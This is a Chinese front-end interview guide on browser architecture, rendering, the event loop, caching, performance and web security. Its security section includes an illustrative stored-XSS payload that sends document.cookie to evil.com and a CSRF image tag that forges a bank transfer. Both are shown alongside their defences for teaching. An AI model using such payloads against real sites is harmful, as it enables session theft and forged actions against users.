## 一、浏览器架构

### 1. 多进程架构

**Chrome 进程模型**(2026):

| 进程 | 作用 | 数量 |
|------|------|------|
| **浏览器进程**(Browser Process) | 地址栏/书签/前进后退 | 1个 |
| **渲染进程**(Renderer Process) | 渲染页面,运行JS | 每个 Tab 1个(隔离) |
| **GPU 进程** | 3D 渲染/合成 | 1个 |
| **网络进程**(Network Process) | 网络请求 | 1个 |
| **插件进程**(Plugin Process) | 运行插件(Flash等) | 每个插件1个 |

**为什么多进程**:
- **稳定性**:单个 Tab 崩溃不影响其他
- **安全性**:沙箱隔离,防止恶意代码
- **性能**:并行处理

## 二、渲染流程(核心)

### 1. 关键渲染路径(CRP)

```
HTML → DOM树
  ↓
CSS  → CSSOM树
  ↓
DOM + CSSOM → 渲染树(Render Tree)
  ↓
Layout(布局/回流) → 计算几何位置
  ↓
Paint(绘制) → 栅格化,生成图层
  ↓
Composite(合成) → GPU合成显示
```

### 2. 详细步骤

**1) 解析 HTML → DOM 树**:

```html
<html>
  <body>
    <div>Hello</div>
  </body>
</html>
```

```
html
└─ body
   └─ div
      └─ "Hello"
```

**2) 解析 CSS → CSSOM 树**:

```css
body { font-size: 16px; }
div { color: red; }
```

```
body { font-size: 16px }
└─ div { font-size: 16px; color: red }  /* 继承 */
```

**3) 合并 → 渲染树**:

- 过滤不可见节点(`display: none`, `<head>`, `<script>`)
- 匹配 CSS 规则

**4) Layout(布局/回流)**:

- 计算每个节点的**几何信息**(位置/大小)
- 根节点从 (0, 0) 开始递归计算

**5) Paint(绘制)**:

- 将节点转换为**像素**(栅格化)
- 分层(多个图层并行绘制)

**6) Composite(合成)**:

- GPU 合成多个图层
- 显示到屏幕

### 3. 重排(Reflow)与重绘(Repaint)

**重排(Reflow)**:几何属性变化,重新计算布局。

触发:
- 增删 DOM
- 改变 `width/height/padding/margin/border/position/display`
- 字体大小变化
- 激活伪类(`:hover`)
- **获取某些属性**:`offsetTop/scrollTop/clientWidth/getComputedStyle`

**重绘(Repaint)**:外观变化,不影响布局。

触发:
- 改变 `color/background/visibility/outline`

**性能影响**:
```
重排(最慢) > 重绘 > 合成(最快,仅GPU,如 transform/opacity)
```

**优化**:

```js
// ❌ 强制同步布局(每次读取触发重排)
for (let i = 0; i < 100; i++) {
  el.style.top = el.offsetTop + 10 + 'px'  // 读→写→读→写
}

// ✅ 批量操作(读写分离)
const top = el.offsetTop  // 一次读取
for (let i = 0; i < 100; i++) {
  el.style.top = top + i * 10 + 'px'
}

// ✅ 用 transform(仅合成,不重排)
el.style.transform = `translateY(${top}px)`
```

**避免布局抖动(Layout Thrashing)**:

```js
// ❌ 布局抖动
divs.forEach(div => {
  const height = div.offsetHeight  // 触发重排
  div.style.height = height + 10 + 'px'
})

// ✅ 读写分离
const heights = divs.map(div => div.offsetHeight)  // 批量读
divs.forEach((div, i) => {
  div.style.height = heights[i] + 10 + 'px'  // 批量写
})
```

## 三、事件循环(Event Loop)

### 1. 浏览器事件循环

```
调用栈(Call Stack)
    ↓ 清空
微任务队列(Microtask Queue)
    ↓ 清空
宏任务队列(Macrotask Queue)
    ↓ 取一个
渲染(Render)
    ↓
回到调用栈
```

**宏任务**(Macrotask):
- `setTimeout/setInterval`
- `I/O`
- `UI 渲染`
- `MessageChannel`

**微任务**(Microtask):
- `Promise.then/catch/finally`
- `MutationObserver`
- `queueMicrotask`

**执行顺序**:

```js
console.log('1')

setTimeout(() => console.log('2'), 0)

Promise.resolve().then(() => console.log('3'))

console.log('4')

// 输出:1 → 4 → 3 → 2
// 同步(1,4) → 微任务(3) → 宏任务(2)
```

### 2. requestAnimationFrame

```js
requestAnimationFrame(() => {
  console.log('rAF')
})

setTimeout(() => console.log('setTimeout'), 0)

Promise.resolve().then(() => console.log('Promise'))

// 输出:Promise → rAF → setTimeout
// 微任务 → rAF(渲染前) → 宏任务
```

**时机**:在浏览器渲染前执行,适合动画。

### 3. requestIdleCallback

```js
requestIdleCallback(deadline => {
  while (deadline.timeRemaining() > 0 && tasks.length) {
    doWork(tasks.shift())
  }
})
```

**时机**:浏览器空闲时执行,适合低优先级任务(React Fiber 的基础)。

## 四、缓存机制

### 1. HTTP 缓存

**强缓存**(不发请求):

```
Cache-Control: max-age=3600  (1小时,优先级高)
Expires: Wed, 21 Oct 2025 07:28:00 GMT  (绝对时间,低优先级)
```

**协商缓存**(发请求,304返回):

```
// 1. Last-Modified / If-Modified-Since
响应:Last-Modified: Wed, 21 Oct 2024 07:28:00 GMT
请求:If-Modified-Since: Wed, 21 Oct 2024 07:28:00 GMT
→ 304 Not Modified(未修改,用缓存)

// 2. ETag / If-None-Match(更精确)
响应:ETag: "abc123"
请求:If-None-Match: "abc123"
→ 304
```

**Cache-Control 指令**:

| 指令 | 作用 |
|------|------|
| `max-age=3600` | 缓存 1 小时 |
| `no-cache` | 需验证(协商缓存) |
| `no-store` | 不缓存(每次重新获取) |
| `public` | 可被中间代理缓存 |
| `private` | 仅浏览器缓存 |
| `immutable` | 永不过期(配合 hash) |

### 2. 浏览器缓存位置(优先级)

1. **Service Worker Cache**:离线缓存,完全可控
2. **Memory Cache**:内存缓存,快但容量小,Tab 关闭即清
3. **Disk Cache**:硬盘缓存,容量大,持久化
4. **Push Cache**:HTTP/2 推送缓存,短暂(5分钟)

### 3. 缓存策略

| 资源类型 | 策略 |
|---------|------|
| **HTML** | `no-cache`(每次验证) |
| **JS/CSS(hash)** | `max-age=31536000, immutable`(永久缓存) |
| **图片** | `max-age=86400`(1天) |
| **API** | `no-store`(不缓存) |

## 五、性能优化

### 1. 关键指标(Web Vitals)

**LCP(Largest Contentful Paint)**:最大内容绘制。
- **目标**:< 2.5s
- **优化**:预加载关键资源/压缩图片/CDN

**FID(First Input Delay)**:首次输入延迟。
- **目标**:< 100ms
- **优化**:减少长任务/代码分割

**CLS(Cumulative Layout Shift)**:累积布局偏移。
- **目标**:< 0.1
- **优化**:图片设 width/height/避免动态插入内容

**TTFB(Time to First Byte)**:首字节时间。
- **目标**:< 600ms
- **优化**:CDN/服务端缓存/压缩

### 2. 资源加载优化

**1) 预加载**:

```html
<!-- 预连接(DNS+TCP+TLS) -->
<link rel="preconnect" href="https://cdn.example.com">

<!-- 预获取(低优先级,空闲时) -->
<link rel="prefetch" href="/next-page.js">

<!-- 预加载(高优先级,当前页) -->
<link rel="preload" href="/critical.js" as="script">

<!-- 预渲染(下一页,激进) -->
<link rel="prerender" href="/next-page.html">
```

**2) 懒加载**:

```html
<!-- 图片懒加载 -->
<img src="placeholder.jpg" data-src="real.jpg" loading="lazy">

<!-- Intersection Observer -->
<script>
const observer = new IntersectionObserver(entries => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const img = entry.target
      img.src = img.dataset.src
      observer.unobserve(img)
    }
  })
})

document.querySelectorAll('img[data-src]').forEach(img => observer.observe(img))
</script>
```

**3) 资源提示**:

```html
<!-- DNS 预解析 -->
<link rel="dns-prefetch" href="https://api.example.com">

<!-- 模块预加载(ES Module) -->
<link rel="modulepreload" href="/app.js">
```

### 3. 代码优化

**1) 减少主线程阻塞**:

```html
<!-- defer:并行下载,DOM解析后执行 -->
<script src="app.js" defer></script>

<!-- async:并行下载,下载完立即执行 -->
<script src="analytics.js" async></script>
```

**2) 长任务拆分**:

```js
// ❌ 长任务(阻塞50ms)
for (let i = 0; i < 100000; i++) {
  doWork(i)
}

// ✅ 时间切片
async function process() {
  for (let i = 0; i < 100000; i++) {
    doWork(i)
    if (i % 100 === 0) {
      await new Promise(resolve => setTimeout(resolve, 0))  // 让出主线程
    }
  }
}
```

**3) Web Worker**:

```js
// main.js
const worker = new Worker('worker.js')
worker.postMessage({ data: largeData })
worker.onmessage = e => console.log(e.data)

// worker.js
onmessage = e => {
  const result = heavyComputation(e.data)
  postMessage(result)
}
```

## 六、安全

### 1. XSS(跨站脚本攻击)

**存储型 XSS**:恶意脚本存到数据库。

```html
<!-- 用户评论 -->
<div>{{userComment}}</div>

<!-- 攻击者输入 -->
<script>fetch('http://evil.com?cookie=' + document.cookie)</script>
```

**防御**:
- **转义输出**:React/Vue 自动转义
- **CSP(内容安全策略)**:

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

- **HttpOnly Cookie**:禁止 JS 访问

### 2. CSRF(跨站请求伪造)

**攻击**:用户登录 A 站,访问恶意 B 站,B 站发请求到 A。

```html
<!-- evil.com -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```

**防御**:
- **CSRF Token**:表单携带随机 token
- **SameSite Cookie**:`SameSite=Strict`
- **验证 Referer/Origin**

### 3. 点击劫持(Clickjacking)

**攻击**:透明 iframe 覆盖页面,诱导点击。

**防御**:

```http
X-Frame-Options: DENY  (禁止被 iframe 嵌入)
Content-Security-Policy: frame-ancestors 'none'
```

## 七、高频面试题

### Q1: 从输入 URL 到页面展示,发生了什么?

1. **URL 解析**:协议/域名/路径
2. **DNS 查询**:域名 → IP(缓存:浏览器→系统→路由器→ISP)
3. **TCP 连接**:三次握手
4. **TLS 握手**(HTTPS):证书验证
5. **HTTP 请求**:发送请求报文
6. **服务器响应**:返回 HTML
7. **解析 HTML**:构建 DOM 树
8. **解析 CSS**:构建 CSSOM 树
9. **执行 JS**:可能阻塞渲染
10. **合成渲染树**:DOM + CSSOM
11. **Layout**:计算布局
12. **Paint**:绘制像素
13. **Composite**:合成显示

### Q2: 为什么 CSS 放头部,JS 放尾部?

**CSS 放 `<head>`**:
- CSS 不阻塞 DOM 解析,但阻塞渲染(防止 FOUC 闪烁)
- 提前加载,避免重排

**JS 放 `</body>` 前**:
- JS 会阻塞 DOM 解析(等待下载+执行)
- 放底部确保 DOM 已构建

**现代做法**:用 `defer/async`。

### Q3: 图层(Layer)如何优化?

**触发图层的属性**:
- `transform/opacity`(合成,不重排重绘)
- `will-change`(提前告知浏览器)
- `position: fixed`
- `video/canvas`

```css
/* GPU 加速 */
.element {
  transform: translateZ(0);  /* 或 translate3d(0,0,0) */
}

/* 提前优化 */
.will-animate {
  will-change: transform;
}
```

**注意**:过多图层消耗内存,适度使用。

### Q4: 浏览器如何解析 CSS 选择器?

**从右往左**:

```css
div .class p { color: red; }
```

1. 找所有 `<p>`
2. 过滤:父级有 `.class`
3. 过滤:祖先有 `<div>`

**为什么不从左往右**:
- 从左往右需遍历整棵 DOM 树
- 从右往左能快速排除不符合的节点

**优化**:
- 避免通配符 `*`
- 减少嵌套层级
- 用 ID/Class,少用标签

### Q5: 如何监控性能?

```js
// Performance API
const paint = performance.getEntriesByType('paint')
console.log('FCP:', paint.find(e => e.name === 'first-contentful-paint').startTime)

// PerformanceObserver
const observer = new PerformanceObserver(list => {
  list.getEntries().forEach(entry => {
    console.log(entry.name, entry.duration)
  })
})
observer.observe({ entryTypes: ['measure', 'navigation'] })

// 上报
navigator.sendBeacon('/analytics', JSON.stringify(metrics))
```
